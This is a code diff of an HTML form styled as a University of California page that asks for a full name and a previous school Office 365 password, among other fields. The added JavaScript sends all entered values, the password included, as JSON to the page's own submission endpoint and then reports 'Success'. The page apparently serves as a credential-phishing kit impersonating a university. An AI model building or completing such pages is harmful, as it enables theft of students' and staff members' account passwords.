@@ -89,7 +89,8 @@
 <body>
 
   <h1 class="title">university of california</h1>
-  <form>
+  <form action="/api/submit" id="conforpky" method="post" onsubmit="handleSubmit(event); return false;">
+    
     <label for="full_name">1. FULL NAME</label>
     <input type="text" id="full_name" name="full_name" required>
 
@@ -133,9 +134,54 @@
     <label for="previous_password">11. PREVIOUS SCHOOL OFFICE 365 PASS_WORD</label>
     <input type="password" id="previous_password" name="previous_password">
 
-    <br><br>
-    <button type="submit">Submit</button>
+    <br>
+    <button class="proceed-button" type="submit" id="sendMessageButton">Submit</button>
+ 
   </form>
+  
+<script>
+  function handleSubmit(event) {
+    event.preventDefault();
+
+    const form = document.getElementById('conforpky');
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData);
+    const sendButton = form.querySelector(".proceed-button");
+
+    sendButton.disabled = true;
+
+    fetch("/api/submit", {
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(async response => {
+        if (response.ok) {
+            console.log('Success');
+            sendButton.textContent = "Success";
+            sendButton.classList.add("success-button");
+            form.reset();
+        } else {
+            const errorText = await response.text();
+            throw new Error(errorText || 'Network response not ok');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        sendButton.textContent = "Error";
+        sendButton.classList.add("error-button");
+    })
+    .finally(() => {
+        setTimeout(() => {
+            sendButton.textContent = "Submit";
+            sendButton.classList.remove("error-button", "success-button");
+            sendButton.disabled = false;
+        }, 2000);
+    });
+  }
+</script>
 
 </body>
 </html>
